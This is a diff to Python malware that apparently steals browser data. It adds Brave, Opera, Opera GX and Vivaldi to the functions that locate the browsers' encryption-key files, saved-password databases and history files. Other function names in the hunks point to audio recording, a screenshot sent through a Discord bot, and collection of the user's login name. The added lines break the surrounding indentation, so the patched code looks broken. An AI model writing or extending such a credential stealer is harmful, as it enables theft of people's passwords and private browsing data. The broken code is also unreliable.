@@ -74,10 +74,18 @@ def record_audio():
 
 def get_encryption_key(browser="chrome"):
     try:
-        if browser == "chrome":
-            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-        elif browser == "edge":
-            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
+    if browser == "chrome":
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    elif browser == "edge":
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
+    elif browser == "brave":
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
+    elif browser == "opera":
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
+    elif browser == "opera_gx":
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
+    elif browser == "vivaldi":
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data", "Local State")
         else:
             raise ValueError("Unsupported browser specified")
 
@@ -122,10 +130,19 @@ def get_passwords_from_browser(browser="chrome"):
     if not key:
         return {}
 
-    if browser == "chrome":
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-    elif browser == "edge":
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
+    paths = {
+        "chrome": ["Google", "Chrome"],
+        "edge": ["Microsoft", "Edge"],
+        "brave": ["BraveSoftware", "Brave-Browser"],
+        "vivaldi": ["Vivaldi", "Vivaldi"],
+    }
+
+    if browser in paths:
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", paths[browser][0], paths[browser][1], "User Data", "Default", "Login Data")
+    elif browser == "opera":
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
+    elif browser == "opera_gx":
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
     else:
         raise ValueError("Unsupported browser specified")
 
@@ -152,6 +169,7 @@ def get_passwords_from_browser(browser="chrome"):
     db.close()
     os.remove(file_name)
     return result
+
     
 def addinfo():
     sillyname = os.getlogin()
@@ -202,7 +220,7 @@ async def on_ready():
                             "url": image_url  
                         },
                         "image": {
-                            "url": "attachment://screenshot.png"  # Aquí se indica que la imagen estará como un archivo adjunto
+                            "url": "attachment://screenshot.png"  # Forgot to put the comment as english
                         }
                     }
                 ],
@@ -307,8 +325,12 @@ def get_browser_history(browser_name):
     try:
         
         browser_paths = {
-            "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
-            "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    "Chrome": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\History"),
+    "Edge": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Microsoft\Edge\User Data\Default\History"),
+    "Brave": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
+    "Vivaldi": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Vivaldi\User Data\Default\History"),
+    "Opera": os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Opera Software\Opera Stable\History"),
+    "Opera GX": os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Opera Software\Opera GX Stable\History"),
         }
 
         if browser_name not in browser_paths:
